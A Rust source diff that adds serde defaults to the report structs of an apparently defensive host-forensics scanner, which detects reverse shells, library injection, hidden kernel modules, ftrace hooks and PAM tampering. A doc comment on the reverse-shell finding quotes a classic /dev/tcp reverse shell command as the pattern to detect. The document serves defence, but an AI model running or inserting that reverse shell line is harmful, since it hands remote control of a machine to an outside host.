@@ -17,13 +17,17 @@ fn one() -> u32 {
 
 /// Result of the mapper's self‑integrity preflight (R11 audit – Fable).
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
+#[serde(default)]
 pub struct SelfIntegrityReport {
     pub compromised: bool,
     #[serde(default)]
     pub warnings: Vec<String>,
 }
 
+// R28-04: container-level serde(default) keeps historical snapshots readable
+// when new fields are added; adding a field can never fail deserialization.
 #[derive(Serialize, Deserialize, Debug, Clone)]
+#[serde(default)]
 pub struct AgentReport {
     pub scan_id: String,
     pub timestamp: String,
@@ -125,6 +129,7 @@ pub enum CronSeverity {
 
 /// A single cron job with its classification.
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct CronJob {
     pub command: String,
     pub severity: CronSeverity,
@@ -173,7 +178,8 @@ pub struct HostInfo {
     pub zombie_details: Vec<ZombieInfo>,
 }
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct ProcessInfo {
     pub name: String,
     pub pid: u32,
@@ -183,6 +189,7 @@ pub struct ProcessInfo {
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct ZombieInfo {
     pub pid: u32,
     pub name: String,
@@ -190,7 +197,8 @@ pub struct ZombieInfo {
     pub parent_name: String,
 }
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct DatabaseInfo {
     pub engine: String,
     pub version: String,
@@ -211,7 +219,8 @@ pub struct NetworkInfo {
     pub dns_upstreams: Vec<String>,
 }
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct SslCertInfo {
     pub domain: String,
     pub expiry_date: String,
@@ -234,11 +243,13 @@ pub struct PortInfo {
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct StorageInfo {
     pub disks: Vec<DiskInfo>,
 }
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct DiskInfo {
     pub mount_point: String,
     pub total_mb: u64,
@@ -248,6 +259,7 @@ pub struct DiskInfo {
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct TopologyInfo {
     pub runtime_active: bool,
     #[serde(default)]
@@ -265,13 +277,15 @@ pub struct TopologyInfo {
     pub build_cache_reclaimable_mb: u64,
 }
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct DanglingImageInfo {
     pub id: String,
     pub size_mb: u64,
 }
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct ContainerInfo {
     pub name: String,
     pub image: String,
@@ -451,7 +465,8 @@ pub struct SecurityInfo {
 /// filesystem. Such a directory allows an unprivileged local attacker to
 /// inject a shared library that takes precedence over system libraries via
 /// ld.so.cache.
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, Serialize, Deserialize, Default)]
+#[serde(default)]
 pub struct LdSoConfInjection {
     /// The path as written in the config file.
     pub path: String,
@@ -503,7 +518,8 @@ pub enum GeneratorKind {
     SearchDir,
 }
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct GeneratorFinding {
     /// Absolute path of the executable, or of the directory for `SearchDir`.
     pub path: String,
@@ -535,7 +551,8 @@ pub struct GeneratorFinding {
 // ═══════════════════════════════════════════════════════════════════════════
 
 /// One line from a PAM service configuration.
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct PamModule {
     pub module_path: String,
 }
@@ -553,7 +570,8 @@ pub enum PamTargetKind {
     Config,
 }
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct PamFinding {
     /// List of PAM service files that reference this module (e.g. "sshd (auth sufficient)").
     #[serde(default)]
@@ -586,11 +604,16 @@ pub struct PamFinding {
     /// The path exactly as written in the PAM configuration file, if it differs
     /// from the resolved module_path (e.g. due to ".." or symlink).  Helps
     /// the analyst locate the line in /etc/pam.d.
-    #[serde(default, skip_serializing_if = "Option::is_none")]
+    ///
+    /// R28-05: `skip_serializing_if` is deliberately NOT used here — the key
+    /// is always emitted; absent and `null` are different claims and JSONL
+    /// schema must not depend on values.
+    #[serde(default)]
     pub declared_as: Option<String>,
 }
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct UserInfo {
     pub username: String,
     pub last_login: String,
@@ -632,7 +655,8 @@ impl PackageManager {
     }
 }
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct UpgradablePackage {
     pub name: String,
     pub current_version: String,
@@ -641,6 +665,7 @@ pub struct UpgradablePackage {
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct PackagesInfo {
     pub manager: PackageManager,
     pub installed_count: usize,
@@ -709,7 +734,8 @@ pub struct MultiHostDiff {
 
 // IAM & Access Alignment Models
 
-#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct SshKeyAudit {
     pub user: String,
     pub algorithm: String,
@@ -719,7 +745,8 @@ pub struct SshKeyAudit {
     pub reason: Option<String>,
 }
 
-#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct SudoersEntry {
     pub principal: String,
     pub source_file: String,
@@ -727,6 +754,7 @@ pub struct SudoersEntry {
 }
 
 #[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct AccessAuditResult {
     #[serde(default)]
     pub keys: Vec<SshKeyAudit>,
@@ -738,7 +766,8 @@ pub struct AccessAuditResult {
 
 // DLP & Secret Hygiene Models
 
-#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct SecretLeak {
     pub pid: u32,
     pub process: String,
@@ -754,6 +783,7 @@ pub struct SecretLeak {
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct SuspiciousProcess {
     pub pid: u32,
     pub name: String,
@@ -790,6 +820,7 @@ pub enum CapReason {
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct ProcCapFinding {
     pub pid: u32,
     pub comm: String,
@@ -819,6 +850,7 @@ pub struct ProcCapFinding {
 /// a log or container-log path (evidence hiding). Parsed from
 /// `/proc/self/mountinfo`.
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct MountMaskingFinding {
     /// Mount point being masked (mountinfo field 5), e.g. `/proc/1234`.
     pub target_path: String,
@@ -840,6 +872,7 @@ pub struct MountMaskingFinding {
 /// classic reverse shell (`bash -i >& /dev/tcp/host/port 0>&1`), correlated
 /// from `/proc/net/tcp{,6}` (established) × `/proc/<pid>/fd`.
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct ReverseShellFinding {
     pub pid: u32,
     /// Process comm (the interpreter name that matched the shell allowlist).
@@ -863,6 +896,7 @@ pub struct ReverseShellFinding {
 /// (LD_PRELOAD / LD_LIBRARY_PATH pointing at an ephemeral path) and
 /// `/proc/<pid>/maps` (a file-backed .so actually mapped from such a path).
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct LibraryInjectionFinding {
     pub pid: u32,
     /// Process comm, for the evidence string.
@@ -880,13 +914,13 @@ pub struct LibraryInjectionFinding {
     pub region_addr: Option<String>,
     /// Deep memory forensics payload (only present with `--deep`).
     /// `None` in fast‑path; silently omitted from JSON when absent.
-    #[serde(default, skip_serializing_if = "Option::is_none")]
+    #[serde(default)]
     pub deep_forensics: Option<DeepMemoryAnalysis>,
     /// R27-62: why `deep_forensics` is absent. `None` = deep scanning was not
     /// attempted for this finding. `Some(reason)` = attempted and blocked
     /// (EACCES pre-5.8, EPERM under YAMA/userns, ENOENT if the VMA is gone,
     /// or region budget exhausted).
-    #[serde(default, skip_serializing_if = "Option::is_none")]
+    #[serde(default)]
     pub deep_unavailable: Option<String>,
     /// Absolute path of the executable (/proc/pid/exe) — reputation through
     /// provenance/cache. NOT derived from the failable process name.
@@ -938,6 +972,7 @@ impl LibraryInjectionFinding {
 /// `confirmed_ioc` distinguishes a hard IoC (survived all cycles, age ≥ 2s,
 /// live state) from a downgraded suspicion (young/racy/unconfirmable).
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct GhostPidFinding {
     pub pid: u32,
     /// Process state from /proc/<pid>/stat (R/S/D/Z/…), if readable.
@@ -963,6 +998,7 @@ pub struct GhostPidFinding {
 /// A file that has been granted capabilities via extended attributes
 /// (e.g. `setcap cap_net_bind_service+ep /usr/bin/node`).
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
+#[serde(default)]
 pub struct FileCapFinding {
     pub path: String,
     /// Human‑readable capability names (e.g. "CAP_NET_BIND_SERVICE")
@@ -992,6 +1028,7 @@ pub struct FileCapFinding {
 
 /// A file with setuid or setgid permission bits.
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
+#[serde(default)]
 pub struct SetuidFinding {
     pub path: String,
     pub setuid: bool,
@@ -1006,6 +1043,7 @@ pub struct SetuidFinding {
 
 /// A loaded BPF program attached to a process.
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
+#[serde(default)]
 pub struct BpfProgInfo {
     pub prog_id: u32,
     pub prog_type: String,
@@ -1017,6 +1055,7 @@ pub struct BpfProgInfo {
 
 /// A BPF map used by a process.
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
+#[serde(default)]
 pub struct BpfMapInfo {
     pub map_id: u32,
     pub map_type: String,
@@ -1026,6 +1065,7 @@ pub struct BpfMapInfo {
 
 /// A pinned BPF object visible in /sys/fs/bpf.
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
+#[serde(default)]
 pub struct BpfPinInfo {
     pub path: String,     // path in /sys/fs/bpf
     pub obj_type: String, // "prog", "map", "link"
@@ -1034,6 +1074,7 @@ pub struct BpfPinInfo {
 
 /// A loaded BPF link (attachment) associated with a process.
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
+#[serde(default)]
 pub struct BpfLinkInfo {
     pub link_id: u32,
     pub prog_id: u32,
@@ -1044,6 +1085,7 @@ pub struct BpfLinkInfo {
 
 /// Full eBPF inventory collected from /proc and /sys/fs/bpf.
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
+#[serde(default)]
 pub struct EbpfInventory {
     #[serde(default)]
     pub programs: Vec<BpfProgInfo>,
@@ -1123,6 +1165,7 @@ pub enum PointerKind {
 
 /// Decoded /proc/sys/kernel/tainted. `raw == 0` ⇒ clean kernel.
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct KernelTaint {
     pub raw: u64,
     #[serde(default)]
@@ -1134,6 +1177,7 @@ pub struct KernelTaint {
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct TaintFlag {
     pub bit: u8,
     pub code: char,   // kernel letter, e.g. 'E'
@@ -1146,6 +1190,7 @@ pub struct TaintFlag {
 // ── LSM confinement (SEC-039) ─────────────────────────────────────────────
 
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct ConfinementReport {
     /// Active LSMs from /sys/kernel/security/lsm.
     #[serde(default)]
@@ -1162,6 +1207,7 @@ pub struct ConfinementReport {
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct ComplainProc {
     pub pid: u32,
     pub comm: String,
@@ -1171,6 +1217,7 @@ pub struct ComplainProc {
 // ── Kernel module integrity (SEC-040) ─────────────────────────────────────
 
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct KernelModuleInventory {
     /// Module names from /proc/modules (canonical loadable list = lsmod).
     #[serde(default)]
@@ -1189,6 +1236,7 @@ pub struct KernelModuleInventory {
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct HiddenModule {
     pub name: String,
     /// Interfaces that still expose it: "sysfs", "kallsyms".
@@ -1199,6 +1247,7 @@ pub struct HiddenModule {
 // ── ftrace/kprobe hook surface (SEC-041) ──────────────────────────────────
 
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct FtraceHookInventory {
     /// Syscall-entry functions carrying an ftrace_ops with NO legitimate source
     /// (not BPF/kprobe/livepatch, no live tracer). Non-empty ⇒ ftrace-rootkit lead.
@@ -1222,6 +1271,7 @@ pub struct FtraceHookInventory {
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct FtraceHook {
     pub function: String,
     pub ops_count: u32,
@@ -1230,6 +1280,7 @@ pub struct FtraceHook {
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone, Default)]
+#[serde(default)]
 pub struct KprobeEntry {
     pub kind: char, // 'p' kprobe / 'r' kretprobe
     pub group_name: String,
@@ -1268,6 +1319,7 @@ pub enum ExecWritability {
 /// An executable path found in an ExecStart directive of a systemd unit or cron job,
 /// flagged because it resides on an ephemeral/writable filesystem or lacks package ownership.
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
+#[serde(default)]
 pub struct ExecStartFinding {
     /// "systemd:<unit>" or "cron:/etc/crontab" etc.
     pub source: String,
@@ -1312,6 +1364,7 @@ pub(crate) fn default_true() -> bool {
 /// injected into every dynamically-linked process without a trace in per-process
 /// environment or (if non-volatile) /proc/pid/maps.
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
+#[serde(default)]
 pub struct PreloadFinding {
     /// Path to the preloaded shared object (as written in the file).
     pub path: String,
